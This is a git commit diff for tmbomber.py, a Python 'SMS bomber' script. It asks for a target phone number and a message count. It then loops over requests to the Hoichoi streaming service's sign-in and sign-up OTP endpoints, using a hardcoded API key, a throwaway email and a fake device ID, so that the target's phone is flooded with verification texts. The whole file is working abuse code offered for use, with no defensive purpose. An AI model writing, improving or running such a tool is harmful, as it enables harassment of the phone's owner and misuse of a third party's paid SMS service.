4b138240a9e458e9ecaaa8bbb95609c8aab94371
MD TASRIF HOSSEN <85736436+ShTasrif@users.noreply.github.com>
2021-06-13 16:40:10 +0600

    Update tmbomber.py

--- tmbomber.py
+++ tmbomber.py
@@ -1,11 +1,53 @@
+import requests as rq
 
-print ("🆃🅰🆂🆁🅸🅵 🅼🆄🅻🆃🅸🅼🅴🅳🅸🅰")
-number=str(input(" Enter The Number : "))
+print ("🆃🅰🆂🆁🅸🅵")
 
-amount=int(input(" Enter The Amount : "))
+"""
+SMS Bomber using Hoichoi SMS api
+"""
 
-api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+def send(target):
+  header = {
+    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
+  }
 
-for i in range(amount):
-	get(api)
-	print(str(i+1)+" SMS Sent ✅")
+  data = {
+    "requestType":"send",
+    "phoneNumber":"+88"+target,
+    "screenName":"signin"
+  }
+
+  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
+  res = rq.post(url, json=data, headers=header)
+  if res.json().get("code"):
+    data = {
+      "requestType":"send",
+      "phoneNumber":"+88"+target,
+      "emailConsent":"true",
+      "whatsappConsent":"true",
+      "email":"cicas94417@iconmle.com"
+    }
+    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+
+    res = rq.post(url, json=data, headers=header)
+    if not res.json().get("sent"): return False
+  return True
+
+def main():
+  target = input("[*] Target Number: ")
+  amount = int(input("[*] Total Amount of SMS to send: "))
+  sent, nsent = 0, amount
+  for i in range(1, amount + 1):
+    try:
+      if send(target):
+        print(f"[ID: {i}] SMS Sent!")
+        sent += 1
+        nsent -= 1
+      else:
+        print(f"[ID: {i}] SMS Not Sent...")
+    except KeyboardInterrupt: break
+    except Exception as e: print(e); break
+  print(f"\n[*] Total Target: {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")
+
+if __name__ == "__main__":
+  main()
